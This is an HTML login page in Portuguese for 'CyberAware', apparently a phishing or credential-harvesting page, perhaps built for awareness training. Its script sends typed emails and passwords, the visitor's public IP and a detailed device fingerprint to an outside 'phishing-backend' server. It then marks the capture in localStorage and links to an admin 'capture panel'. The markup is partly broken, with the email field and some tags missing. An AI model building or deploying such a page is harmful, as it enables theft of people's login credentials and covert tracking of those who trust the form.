<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#0a0e27">
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
<title>Login - CyberAware</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}

html,body{
  width:100%;
  height:100%;
  overflow:hidden;
}

body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
  background:#0a0e27;
  color:#fff;
  -webkit-text-size-adjust:100%;
}

/* === ANIMATED BACKGROUND === */
.bg-animation{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  z-index:0;
  background:linear-gradient(135deg,#0a0e27 0%,#1a1f4e 50%,#0a0e27 100%);
  background-size:400% 400%;
  animation:gradientShift 15s ease infinite;
}

@keyframes gradientShift{
  0%{background-position:0% 50%}
  50%{background-position:100% 50%}
  100%{background-position:0% 50%}
}

.bg-shapes{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  z-index:1;
  overflow:hidden;
  pointer-events:none;
}

.shape{
  position:absolute;
  border-radius:50%;
  opacity:0.1;
  animation:float 20s infinite ease-in-out;
}

.shape:nth-child(1){
  width:300px;height:300px;
  background:radial-gradient(circle,#ff3b3b,transparent);
  top:-100px;left:-100px;
  animation-delay:0s;
}

.shape:nth-child(2){
  width:400px;height:400px;
  background:radial-gradient(circle,#00e5ff,transparent);
  bottom:-150px;right:-150px;
  animation-delay:5s;
}

.shape:nth-child(3){
  width:250px;height:250px;
  background:radial-gradient(circle,#ffa500,transparent);
  top:50%;left:50%;
  transform:translate(-50%,-50%);
  animation-delay:10s;
}

@keyframes float{
  0%,100%{transform:translate(0,0) scale(1)}
  25%{transform:translate(50px,-50px) scale(1.1)}
  50%{transform:translate(-30px,80px) scale(0.9)}
  75%{transform:translate(-60px,-30px) scale(1.05)}
}

/* === PARTICLES === */
.particles{
  position:fixed;
  top:0;left:0;
  width:100%;height:100%;
  z-index:2;
  pointer-events:none;
}

.particle{
  position:absolute;
  width:3px;height:3px;
  background:rgba(255,255,255,0.5);
  border-radius:50%;
  animation:particleFloat 10s infinite linear;
}

@keyframes particleFloat{
  0%{transform:translateY(100vh) rotate(0deg);opacity:0}
  10%{opacity:1}
  90%{opacity:1}
  100%{transform:translateY(-100px) rotate(360deg);opacity:0}
}

/* === LOGIN CONTAINER === */
.login-container{
  position:relative;
  z-index:10;
  width:100%;
  max-width:420px;
  padding:16px;
  max-height:100vh;
  overflow-y:auto;
  display:flex;
  align-items:center;
  justify-content:center;
}

.login-card{
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(20px);
  -webkit-backdrop-filter:blur(20px);
  border:1px solid rgba(255,255,255,0.15);
  border-radius:24px;
  padding:40px 36px;
  box-shadow:0 25px 50px rgba(0,0,0,0.3);
  animation:cardAppear 0.8s cubic-bezier(0.175,0.885,0.32,1.275);
  width:100%;
}

@keyframes cardAppear{
  from{opacity:0;transform:translateY(30px) scale(0.95)}
  to{opacity:1;transform:translateY(0) scale(1)}
}

.login-header{
  text-align:center;
  margin-bottom:32px;
}

.login-logo{
  width:60px;height:60px;
  margin:0 auto 16px;
  background:linear-gradient(135deg,#ff3b3b,#ff6b6b);
  border-radius:16px;
  display:flex;
  align-items:center;
  justify-content:center;
  animation:logoPulse 3s infinite ease-in-out;
  box-shadow:0 10px 30px rgba(255,59,59,0.3);
}

@keyframes logoPulse{
  0%,100%{transform:scale(1);box-shadow:0 10px 30px rgba(255,59,59,0.3)}
  50%{transform:scale(1.05);box-shadow:0 15px 40px rgba(255,59,59,0.5)}
}

.login-logo svg{
  width:32px;height:32px;
  stroke:#fff;
  fill:none;
  stroke-width:2;
}

.login-title{
  font-size:clamp(1.5rem,5vw,1.8rem);
  font-weight:700;
  margin-bottom:6px;
  background:linear-gradient(135deg,#fff,#a0a0a0);
  -webkit-background-clip:text;
  -webkit-text-fill-color:transparent;
  background-clip:text;
}

.login-subtitle{
  font-size:clamp(0.82rem,2.5vw,0.9rem);
  color:rgba(255,255,255,0.6);
}

/* === FORM === */
.form-group{
  margin-bottom:18px;
  position:relative;
}

.form-label{
  display:block;
  font-size:0.82rem;
  font-weight:600;
  margin-bottom:6px;
  color:rgba(255,255,255,0.8);
  transition:color 0.3s;
}

.form-input{
  width:100%;
  padding:12px 14px;
  background:rgba(255,255,255,0.05);
  border:2px solid rgba(255,255,255,0.1);
  border-radius:10px;
  color:#fff;
  font-size:0.92rem;
  font-family:inherit;
  transition:all 0.3s ease;
  outline:none;
  -webkit-appearance:none;
}

.form-input::placeholder{
  color:rgba(255,255,255,0.3);
}

.form-input:focus{
  background:rgba(255,255,255,0.08);
  border-color:#ff3b3b;
  box-shadow:0 0 0 3px rgba(255,59,59,0.1);
}

.form-input.error{
  border-color:#ff3b3b;
  animation:shake 0.4s;
}

@keyframes shake{
  0%,100%{transform:translateX(0)}
  25%{transform:translateX(-5px)}
  75%{transform:translateX(5px)}
}

.password-wrapper{
  position:relative;
}

.password-toggle{
  position:absolute;
  right:12px;
  top:50%;
  transform:translateY(-50%);
  background:none;
  border:none;
  cursor:pointer;
  padding:4px;
  display:flex;
  align-items:center;
  justify-content:center;
}

.password-toggle svg{
  width:18px;height:18px;
  stroke:rgba(255,255,255,0.5);
  fill:none;
  stroke-width:2;
  transition:stroke 0.3s;
}

.password-toggle:hover svg{
  stroke:#fff;
}

/* === OPTIONS === */
.form-options{
  display:flex;
  justify-content:space-between;
  align-items:center;
  margin-bottom:22px;
  font-size:0.82rem;
  flex-wrap:wrap;
  gap:8px;
}

.remember-me{
  display:flex;
  align-items:center;
  gap:6px;
  cursor:pointer;
  color:rgba(255,255,255,0.7);
  transition:color 0.3s;
}

.remember-me:hover{
  color:#fff;
}

.checkbox{
  width:16px;height:16px;
  border:2px solid rgba(255,255,255,0.3);
  border-radius:4px;
  display:flex;
  align-items:center;
  justify-content:center;
  transition:all 0.3s;
}

.remember-me input{
  display:none;
}

.remember-me input:checked + .checkbox{
  background:#ff3b3b;
  border-color:#ff3b3b;
}

.remember-me input:checked + .checkbox::after{
  content:'✓';
  color:#fff;
  font-size:10px;
  font-weight:bold;
}

.forgot-password{
  color:#ff3b3b;
  text-decoration:none;
  font-weight:600;
  transition:all 0.3s;
  position:relative;
}

.forgot-password::after{
  content:'';
  position:absolute;
  bottom:-2px;
  left:0;
  width:0;
  height:2px;
  background:#ff3b3b;
  transition:width 0.3s;
}

.forgot-password:hover::after{
  width:100%;
}

/* === BUTTON === */
.login-button{
  width:100%;
  padding:14px;
  background:linear-gradient(135deg,#ff3b3b,#ff6b6b);
  border:none;
  border-radius:10px;
  color:#fff;
  font-size:0.95rem;
  font-weight:700;
  font-family:inherit;
  cursor:pointer;
  transition:all 0.3s ease;
  position:relative;
  overflow:hidden;
  text-transform:uppercase;
  letter-spacing:1px;
}

.login-button::before{
  content:'';
  position:absolute;
  top:50%;
  left:50%;
  width:0;
  height:0;
  border-radius:50%;
  background:rgba(255,255,255,0.3);
  transform:translate(-50%,-50%);
  transition:width 0.6s,height 0.6s;
}

.login-button:hover::before{
  width:300px;
  height:300px;
}

.login-button:hover{
  transform:translateY(-2px);
  box-shadow:0 10px 30px rgba(255,59,59,0.4);
}

.login-button:active{
  transform:translateY(0);
}

/* === DIVIDER === */
.divider{
  display:flex;
  align-items:center;
  margin:22px 0;
  color:rgba(255,255,255,0.4);
  font-size:0.8rem;
}

.divider::before,.divider::after{
  content:'';
  flex:1;
  height:1px;
  background:rgba(255,255,255,0.1);
}

.divider span{
  padding:0 12px;
}

/* === SOCIAL LOGIN === */
.social-login{
  display:flex;
  gap:10px;
}

.social-button{
  flex:1;
  padding:11px;
  background:rgba(255,255,255,0.05);
  border:2px solid rgba(255,255,255,0.1);
  border-radius:10px;
  cursor:not-allowed;
  transition:all 0.3s;
  display:flex;
  align-items:center;
  justify-content:center;
  opacity:0.6;
}

.social-button svg{
  width:22px;height:22px;
}

.social-button.google{
  flex:2.2;
  background:rgba(255,255,255,0.1);
  border-color:rgba(255,255,255,0.25);
  position:relative;
  overflow:hidden;
  opacity:1;
}

.social-button.google::before{
  content:'';
  position:absolute;
  top:0;left:0;right:0;bottom:0;
  background:linear-gradient(135deg,rgba(66,133,244,0.1),rgba(234,67,53,0.1));
  opacity:0;
  transition:opacity 0.3s;
}

.social-button.google:hover::before{
  opacity:1;
}

.social-button.google svg{
  width:24px;height:24px;
}

/* === FOOTER === */
.login-footer{
  text-align:center;
  margin-top:18px;
  font-size:0.75rem;
  color:rgba(255,255,255,0.4);
}

.login-footer a{
  color:#ff3b3b;
  text-decoration:none;
  font-weight:600;
}

/* === RESPONSIVE === */
@media(max-width:480px){
  .login-card{
    padding:28px 22px;
    border-radius:20px;
    background:rgba(255,255,255,0.1);
  }
  
  .login-header{
    margin-bottom:24px;
  }
  
  .login-logo{
    width:52px;height:52px;
    margin-bottom:12px;
  }
  
  .login-logo svg{
    width:28px;height:28px;
  }
  
  .form-group{
    margin-bottom:14px;
  }
  
  .form-input{
    padding:11px 12px;
    font-size:0.88rem;
  }
  
  .login-button{
    padding:13px;
    font-size:0.9rem;
  }
  
  .shape{
    display:none;
  }
  
  .login-container{
    padding:12px;
  }
  
  .form-options{
    margin-bottom:18px;
  }
  
  .divider{
    margin:18px 0;
  }
}

@media(max-width:360px){
  .login-card{
    padding:24px 18px;
  }
  
  .login-title{
    font-size:1.4rem;
  }
  
  .form-input{
    padding:10px 11px;
    font-size:0.85rem;
  }
  
  .social-button{
    padding:10px;
  }
}

@media(max-height:600px){
  .login-card{
    padding:24px 22px;
  }
  
  .login-header{
    margin-bottom:18px;
  }
  
  .login-logo{
    width:48px;height:48px;
    margin-bottom:10px;
  }
  
  .form-group{
    margin-bottom:12px;
  }
  
  .divider{
    margin:14px 0;
  }
}

/* === LOADING STATE === */
.login-button.loading{
  pointer-events:none;
  opacity:0.8;
}

.login-button.loading::after{
  content:'';
  position:absolute;
  top:50%;
  left:50%;
  width:22px;
  height:22px;
  margin:-11px 0 0 -11px;
  border:3px solid rgba(255,255,255,0.3);
  border-top-color:#fff;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
}

@keyframes spin{
  to{transform:rotate(360deg)}
}

/* === SUCCESS STATE === */
.login-button.success{
  background:linear-gradient(135deg,#00c853,#69f0ae);
}

/* === ERROR MESSAGE === */
.error-message{
  color:#ff3b3b;
  font-size:0.72rem;
  margin-top:5px;
  display:none;
  animation:fadeIn 0.3s;
}

.error-message.show{
  display:block;
}

@keyframes fadeIn{
  from{opacity:0;transform:translateY(-5px)}
  to{opacity:1;transform:translateY(0)}
}
</style>
</head>
<body>

<div class="bg-animation"></div>

<div class="bg-shapes">
  <div class="shape"></div>
  <div class="shape"></div>
  <div class="shape"></div>
</div>

<div class="particles" id="particles"></div>

<div class="login-container">
  <div class="login-card">
    <div class="login-header">
      <div class="login-logo">
        <svg viewBox="0 0 24 24"><path d="M12 2L3 7v10l9 5 9-5V7l-9-5z"/></svg>

    <form id="loginForm">

        <div class="error-message" id="emailError">Por favor, use um email válido</div>
      </div>

      <div class="form-group">
        <label class="form-label" for="password">Senha</label>
        <div class="password-wrapper">
          <input type="password" id="password" class="form-input" placeholder="••••••••" required minlength="8" autocomplete="current-password">
          <button type="button" class="password-toggle" id="passwordToggle">
            <svg id="eyeIcon" viewBox="0 0 24 24">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
              <circle cx="12" cy="12" r="3"/>
            </svg>
          </button>

      <div class="form-options">

          <input type="checkbox" id="remember">
          <span class="checkbox"></span>
          Lembrar-me
        </label>

      <button type="submit" class="login-button" id="loginButton">

      </button>
    </form>

    <div class="divider">
      <span>ou continue com</span>
    </div>

    <div class="social-login">
      <button class="social-button google" type="button" disabled>
        <svg viewBox="0 0 24 24">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>

        </svg>
      </button>
    </div>

    <div class="login-footer">
      <a href="/logs" style="color:#ff3b3b;font-weight:600;">📊 Painel de Capturas (Admin)</a>
    </div>
  </div>
</div>

<script>
const API_URL = 'https://phishing-backend-50tr.onrender.com/api';

// Partículas
(function(){
  var particlesContainer = document.getElementById('particles');
  for(var i = 0; i < 25; i++){
    var particle = document.createElement('div');
    particle.className = 'particle';
    particle.style.left = Math.random() * 100 + '%';
    particle.style.animationDuration = (Math.random() * 10 + 8) + 's';
    particle.style.animationDelay = Math.random() * 5 + 's';
    particle.style.opacity = Math.random() * 0.5 + 0.2;
    particlesContainer.appendChild(particle);
  }
})();

// Toggle de senha
var passwordToggle = document.getElementById('passwordToggle');
var passwordInput = document.getElementById('password');
var eyeIcon = document.getElementById('eyeIcon');

passwordToggle.addEventListener('click', function(){
  if(passwordInput.type === 'password'){
    passwordInput.type = 'text';
    eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
  } else {
    passwordInput.type = 'password';
    eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
  }
});

// Validação
var emailInput = document.getElementById('email');
var emailError = document.getElementById('emailError');
var passwordError = document.getElementById('passwordError');

emailInput.addEventListener('input', function(){
  if(this.classList.contains('error')){
    this.classList.remove('error');
    emailError.classList.remove('show');
  }
});

passwordInput.addEventListener('input', function(){
  if(this.classList.contains('error')){
    this.classList.remove('error');
    passwordError.classList.remove('show');
  }
});

// Login
var loginForm = document.getElementById('loginForm');
var loginButton = document.getElementById('loginButton');

// Função para capturar IP público do usuário
async function getUserIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip;
  } catch (e) {
    try {
      const res = await fetch('https://api.ipapi.co/json/');
      const data = await res.json();
      return data.ip;
    } catch (e2) {
      return 'unknown';
    }
  }
}

// Função para capturar informações detalhadas do dispositivo
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const lang = navigator.language || 'unknown';
  const platform = navigator.platform || 'unknown';
  const screenRes = `${screen.width}x${screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
  const cores = navigator.hardwareConcurrency || 'unknown';
  const memory = navigator.deviceMemory || 'unknown';
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const networkType = connection ? (connection.effectiveType || connection.type || 'unknown') : 'unknown';
  const batterySupported = 'getBattery' in navigator;
  
  return {
    user_agent: ua,
    language: lang,
    platform: platform,
    screen: screenRes,
    timezone: timezone,
    cores: cores,
    memory: memory,
    network: networkType,
    battery: batterySupported,
    cookies: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || 'unknown',
    online: navigator.onLine,
    referrer: document.referrer || 'direct',
    url: window.location.href
  };
}

loginForm.addEventListener('submit', async function(e){
  e.preventDefault();
  
  var email = emailInput.value.trim();
  var password = passwordInput.value;
  
  // Validação email
  if(!email || !email.includes('@')){
    emailInput.classList.add('error');
    emailError.classList.add('show');
    return;
  }
  
  // Validação senha
  if(password.length < 8){
    passwordInput.classList.add('error');
    passwordError.classList.add('show');
    return;
  }
  
  loginButton.classList.add('loading');
  loginButton.textContent = '';
  
  try {
    // Capturar IP e informações do dispositivo em paralelo
    const [userIP, deviceInfo] = await Promise.all([
      getUserIP(),
      Promise.resolve(getDeviceInfo())
    ]);
    
    const response = await fetch(`${API_URL}/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        email, 
        password,
        client_ip: userIP,
        device_info: deviceInfo
      })
    });
    
    const data = await response.json();
    
    if (response.ok) {
      // Marcar como logado no localStorage
      localStorage.setItem('phishing_logged_in', 'true');
      localStorage.setItem('phishing_user_email', email);
      localStorage.setItem('phishing_login_time', new Date().toISOString());
      
      loginButton.classList.remove('loading');
      loginButton.classList.add('success');
      loginButton.textContent = '✓ Sucesso!';
      
      // Registrar service worker
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').catch(function(){});
      }
      
      // Redirecionar após 1.5s
      setTimeout(function(){
        window.location.href = '/apos_login.html';
      }, 1500);
    } else {
      loginButton.classList.remove('loading');
      loginButton.textContent = 'Entrar';
      emailInput.classList.add('error');
      emailError.textContent = data.error || 'Erro ao fazer login';
      emailError.classList.add('show');
    }
  } catch (err) {
    loginButton.classList.remove('loading');
    loginButton.textContent = 'Entrar';
    emailError.textContent = 'Erro de conexão. Tente novamente.';
    emailError.classList.add('show');
  }
});
</script>

</body>
</html>
